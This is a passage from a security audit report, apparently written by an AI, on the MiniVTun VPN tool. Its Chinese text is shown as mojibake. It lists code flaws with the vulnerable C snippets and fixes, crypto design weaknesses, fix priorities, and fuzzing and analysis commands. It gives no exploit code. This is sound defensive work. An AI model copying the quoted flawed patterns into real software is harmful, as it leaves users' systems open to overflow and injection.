`sprintf` åˆ°å›ºå®šå¤§å°ç¼“å†²åŒº,æœªæ£€æŸ¥é•¿åº¦ã€‚

```c
char cmd[1024];
sprintf(cmd, "ip %s route add %s/%d dev %s metric %d table %s", ...); // âš ï¸
```

**ä¿®å¤**: ä½¿ç”¨ `snprintf` å¹¶æ£€æŸ¥è¿”å›å€¼ã€‚

---

### 13. ã€ä¸­å±ã€‘assert åœ¨ç”Ÿäº§ç¯å¢ƒå¯è¢«ä¼˜åŒ–æ‰

**ä½ç½®**: `src/minivtun.c:92`, `src/client.c:332`

**é—®é¢˜**:
ä½¿ç”¨ `assert()` åšå…³é”®æ£€æŸ¥,ç¼–è¯‘æ—¶ `-DNDEBUG` ä¼šç¦ç”¨ã€‚

```c
assert(state.stats_buckets); // å¦‚æœ malloc å¤±è´¥,Release ç‰ˆæœ¬ä¸ä¼šé€€å‡º
```

**ä¿®å¤**: ä½¿ç”¨æ˜¾å¼æ£€æŸ¥:
```c
if (!state.stats_buckets) {
    PLOG("Failed to allocate stats_buckets");
    exit(1);
}
```

---

### 14. ã€ä¸­å±ã€‘æ—¥å¿—å¯èƒ½æ³„éœ²æ•æ„Ÿä¿¡æ¯

**ä½ç½®**: å¤šå¤„æ—¥å¿—è¾“å‡º

**é—®é¢˜**: IP åœ°å€ã€ç«¯å£ã€åŠ å¯†ç®—æ³•ç­‰ä¿¡æ¯å†™å…¥ syslog,å¯èƒ½æ³„éœ²ã€‚

**ä¿®å¤**: ç”Ÿäº§ç¯å¢ƒç¦ç”¨è¯¦ç»†æ—¥å¿—,æˆ–è„±æ•å¤„ç†ã€‚

---

## ğŸŸ¢ ä½å±é—®é¢˜ (Low)

### 15. ã€ä½å±ã€‘æ–‡ä»¶æè¿°ç¬¦æ³„æ¼

**ä½ç½®**: `src/client.c:362-365`, `src/server.c:717-720`

**é—®é¢˜**: PID æ–‡ä»¶æ‰“å¼€åæœªè°ƒç”¨ `fclose()`ã€‚

**ä¿®å¤**: ä½¿ç”¨ RAII æ¨¡å¼æˆ– `fclose(fp)`ã€‚

---

### 16. ã€ä½å±ã€‘å…¨å±€é™æ€å˜é‡ç«äº‰æ¡ä»¶

**ä½ç½®**: `src/server.c:26`, `src/client.c:25`

**é—®é¢˜**: å…¨å±€å˜é‡åœ¨ä¿¡å·å¤„ç†å‡½æ•°ä¸­ä¿®æ”¹,æœªåŠ é”ã€‚

```c
static bool rewind_dynamic_link_metric = false; // âš ï¸

static void usr1_signal_handler(int signum) {
    rewind_dynamic_link_metric = true; // ä¸»çº¿ç¨‹è¯»å–
}
```

**ä¿®å¤**: ä½¿ç”¨ `volatile sig_atomic_t` ç±»å‹ã€‚

---

### 17. ã€ä½å±ã€‘ç¡¬ç¼–ç è¶…æ—¶å€¼

**ä½ç½®**: `src/minivtun.c:36`, é…ç½®é»˜è®¤å€¼

**é—®é¢˜**: é‡è¿è¶…æ—¶ 47 ç§’æ— æ³•è°ƒæ•´,ä¸é€‚åˆé«˜å»¶è¿Ÿç½‘ç»œã€‚

**ä¿®å¤**: å…è®¸é€šè¿‡å‘½ä»¤è¡Œå‚æ•°è‡ªå®šä¹‰ã€‚

---

### 18. ã€ä½å±ã€‘IPv6 å‰ç¼€é•¿åº¦æœªéªŒè¯

**ä½ç½®**: `src/server.c:64`

**é—®é¢˜**:
```c
n.s6_addr[rt->prefix / 8] &= ~((1 << (8 - rt->prefix % 8)) - 1);
```
å¦‚æœ `rt->prefix > 128`,ä¼šå¯¼è‡´æ•°ç»„è¶Šç•Œã€‚

**ä¿®å¤**: æ·»åŠ è¾¹ç•Œæ£€æŸ¥ `if (rt->prefix > 128) return;`

---

## æ¶æ„è®¾è®¡é—®é¢˜

### 19. ç¼ºå°‘å‰å‘ä¿å¯† (Forward Secrecy)

**é—®é¢˜**: ä½¿ç”¨é™æ€å¯†é’¥,å¯†é’¥æ³„éœ²åæ‰€æœ‰å†å²æµé‡å¯è¢«è§£å¯†ã€‚

**å»ºè®®**: å®ç°å¯†é’¥äº¤æ¢åè®® (å¦‚ Diffie-Hellman),å®šæœŸè½®æ¢ä¼šè¯å¯†é’¥ã€‚

---

### 20. æ— å®Œæ•´æ€§ä¿æŠ¤ (Integrity Protection)

**é—®é¢˜**: CBC æ¨¡å¼ä¸æä¾›å®Œæ•´æ€§æ ¡éªŒ,å…è®¸å¯†æ–‡ç¯¡æ”¹ã€‚

**å»ºè®®**:
- ä½¿ç”¨ AEAD åŠ å¯† (AES-GCM, ChaCha20-Poly1305)
- æˆ–æ·»åŠ  HMAC æ ¡éªŒ (Encrypt-then-MAC)

---

### 21. å•ç‚¹æ•…éšœ

**é—®é¢˜**: æœåŠ¡å™¨å•çº¿ç¨‹,ä¸€ä¸ªé˜»å¡æ“ä½œä¼šå½±å“æ‰€æœ‰å®¢æˆ·ç«¯ã€‚

**å»ºè®®**: ä½¿ç”¨ `epoll/kqueue` æˆ–å¤šçº¿ç¨‹æ¶æ„ã€‚

---

## åˆè§„æ€§é—®é¢˜

### 22. ä½¿ç”¨å·²å¼ƒç”¨çš„ OpenSSL API

**ä½ç½®**: `src/crypto_openssl.c:144`, `src/crypto_openssl.c:154`

**é—®é¢˜**:
```c
EVP_CIPHER_CTX_init(ctx);     // âŒ OpenSSL 1.1.0 å·²å¼ƒç”¨
EVP_CIPHER_CTX_cleanup(ctx);  // âŒ åº”ä½¿ç”¨ EVP_CIPHER_CTX_reset()
```

**å½±å“**: OpenSSL 3.0 ä¸­è¿™äº›å‡½æ•°å·²ç§»é™¤ã€‚

**ä¿®å¤**:
```c
EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new(); // å·²åœ¨ä»£ç ä¸­ä½¿ç”¨
// åˆ é™¤ EVP_CIPHER_CTX_init() è°ƒç”¨
EVP_CIPHER_CTX_reset(ctx);  // æ›¿ä»£ cleanup
EVP_CIPHER_CTX_free(ctx);   // å·²æ­£ç¡®ä½¿ç”¨
```

---

## ä¿®å¤ä¼˜å…ˆçº§å»ºè®®

### ç«‹å³ä¿®å¤ (1-7 å¤©)

1. **æ¼æ´ #3**: auth_key æ»¥ç”¨ â†’ ç¨‹åºå®Œå…¨æ— æ³•å·¥ä½œ
2. **æ¼æ´ #4**: å‘½ä»¤æ³¨å…¥ â†’ è¿œç¨‹ä»£ç æ‰§è¡Œ
3. **æ¼æ´ #6**: æ•´æ•°æº¢å‡º â†’ å†…å­˜ç ´å

### é«˜ä¼˜å…ˆçº§ (1-2 å‘¨)

4. **æ¼æ´ #1**: å›ºå®š IV â†’ åŠ å¯†å¼ºåº¦ä¸¥é‡ä¸è¶³
5. **æ¼æ´ #2**: å¼±å¯†é’¥æ´¾ç”Ÿ â†’ æ˜“è¢«æš´åŠ›ç ´è§£
6. **æ¼æ´ #7**: DoS æ”»å‡» â†’ æœåŠ¡å¯ç”¨æ€§

### ä¸­ç­‰ä¼˜å…ˆçº§ (1 ä¸ªæœˆ)

7. **æ¼æ´ #8**: é‡æ”¾æ”»å‡» â†’ åè®®å®‰å…¨æ€§
8. **é—®é¢˜ #10**: å¼±éšæœºæ•° â†’ å¯é¢„æµ‹æ€§
9. **é—®é¢˜ #12**: sprintf æº¢å‡º â†’ æ½œåœ¨å´©æºƒ

### é•¿æœŸæ”¹è¿›

10. è¿ç§»åˆ° AEAD åŠ å¯†
11. å®ç°å¯†é’¥äº¤æ¢åè®®
12. é‡æ„ä¸ºäº‹ä»¶é©±åŠ¨æ¶æ„

---

## å®‰å…¨ç¼–ç è§„èŒƒå»ºè®®

### å†…å­˜å®‰å…¨

```c
// âœ… æ­£ç¡®
char *buf = malloc(size);
if (!buf) { PLOG(...); return -1; }
// ä½¿ç”¨ buf
free(buf);

// âŒ é”™è¯¯
char *buf = malloc(size);
assert(buf); // Release ç‰ˆæœ¬å¤±æ•ˆ
```

### å­—ç¬¦ä¸²å¤„ç†

```c
// âœ… æ¨è
snprintf(buf, sizeof(buf), "%s", str);
strlcpy(buf, str, sizeof(buf)); // BSD

// âŒ å±é™©
strcpy(buf, str);
sprintf(buf, "%s", str);
```

### è¾“å…¥éªŒè¯

```c
// âœ… é˜²å¾¡æ€§ç¼–ç¨‹
if (len > MAX_SIZE || len < MIN_SIZE) return -1;
if (!is_valid_address(addr)) return -1;

// âŒ å‡è®¾è¾“å…¥å¯ä¿¡
process_data(untrusted_input);
```

---

## æµ‹è¯•å»ºè®®

### æ¨¡ç³Šæµ‹è¯•

```bash
# ä½¿ç”¨ AFL++ æµ‹è¯•æ•°æ®åŒ…å¤„ç†
afl-gcc -o minivtun-fuzz src/*.c
afl-fuzz -i seeds/ -o findings/ -- ./minivtun-fuzz @@
```

### é™æ€åˆ†æ

```bash
# Clang Static Analyzer
scan-build make

# Coverity Scan
cov-build --dir cov-int make
```

### å†…å­˜æ£€æŸ¥

```bash
# Valgrind
valgrind --leak-check=full ./minivtun ...

# AddressSanitizer
gcc -fsanitize=address -g src/*.c
```

---

## æ€»ç»“

MiniVTun ä½œä¸ºä¸€ä¸ªè½»é‡çº§ VPN å·¥å…·,åœ¨æ€§èƒ½å’Œç®€æ´æ€§æ–¹é¢è¡¨ç°ä¼˜ç§€,ä½†å­˜åœ¨**å¤šä¸ªä¸¥é‡å®‰å…¨æ¼æ´**,ä¸å»ºè®®åœ¨ç”Ÿäº§ç¯å¢ƒä½¿ç”¨æœªä¿®å¤çš„ç‰ˆæœ¬ã€‚

### å…³é”®é—®é¢˜

1. **åŠ å¯†å®ç°å­˜åœ¨æ ¹æœ¬æ€§ç¼ºé™·** (å›ºå®š IVã€å¼±å¯†é’¥æ´¾ç”Ÿã€ä¼ªè®¤è¯)
2. **è¾“å…¥éªŒè¯ä¸è¶³** (å‘½ä»¤æ³¨å…¥ã€æ•´æ•°æº¢å‡ºã€ç¼“å†²åŒºæº¢å‡º)
3. **ç¼ºä¹ç°ä»£å®‰å…¨æœºåˆ¶** (æ— é‡æ”¾é˜²æŠ¤ã€æ— å®Œæ•´æ€§æ ¡éªŒã€æ— å‰å‘ä¿å¯†)

### é€‚ç”¨åœºæ™¯

- âœ… **å­¦ä¹ ç½‘ç»œç¼–ç¨‹**: ä»£ç ç®€æ´,æ¶æ„æ¸…æ™°
- âœ… **éå®‰å…¨åœºæ™¯**: å†…ç½‘æµ‹è¯•ã€å®éªŒç¯å¢ƒ
- âš ï¸ **è½»åº¦å®‰å…¨éœ€æ±‚**: ä¿®å¤ä¸¥é‡æ¼æ´åå¯ç”¨äºå¯¹æŠ—æµé‡æ£€æµ‹
- âŒ **é«˜å®‰å…¨åœºæ™¯**: ä¸å»ºè®®ç”¨äºä¼ä¸š VPNã€é‡‘èç½‘ç»œç­‰

### å¯¹æ¯”ä¸»æµæ–¹æ¡ˆ

| é¡¹ç›® | åŠ å¯†å¼ºåº¦ | è®¤è¯æœºåˆ¶ | é‡æ”¾é˜²æŠ¤ | å‰å‘ä¿å¯† | æˆç†Ÿåº¦ |
|------|----------|----------|----------|----------|--------|
| **MiniVTun** | âš ï¸ å¼± | âŒ æ—  | âŒ æ—  | âŒ æ—  | å®éªŒæ€§ |
| **WireGuard** | âœ… å¼º | âœ… å…¬é’¥ | âœ… æœ‰ | âœ… æœ‰ | ç”Ÿäº§çº§ |
| **OpenVPN** | âœ… å¼º | âœ… è¯ä¹¦/PSK | âœ… æœ‰ | âœ… æœ‰ | ç”Ÿäº§çº§ |
| **IPsec** | âœ… å¼º | âœ… IKE | âœ… æœ‰ | âœ… æœ‰ | ç”Ÿäº§çº§ |

### æœ€ç»ˆå»ºè®®

å¦‚æœéœ€è¦ç”Ÿäº§ç¯å¢ƒä½¿ç”¨,å»ºè®®:
1. ä¿®å¤æ‰€æœ‰ä¸¥é‡å’Œé«˜å±æ¼æ´
2. è¿›è¡Œä¸“ä¸šå®‰å…¨å®¡è®¡
3. æˆ–ç›´æ¥ä½¿ç”¨ WireGuard ç­‰æˆç†Ÿæ–¹æ¡ˆ

---

**å®¡è®¡äººå‘˜**: Claude (Anthropic AI)
**å®¡è®¡å·¥å…·**: é™æ€ä»£ç åˆ†æã€æ‰‹åŠ¨å®‰å…¨å®¡æŸ¥
**å‚è€ƒæ ‡å‡†**: OWASP Top 10, CWE Top 25, NIST åŠ å¯†æ ‡å‡†
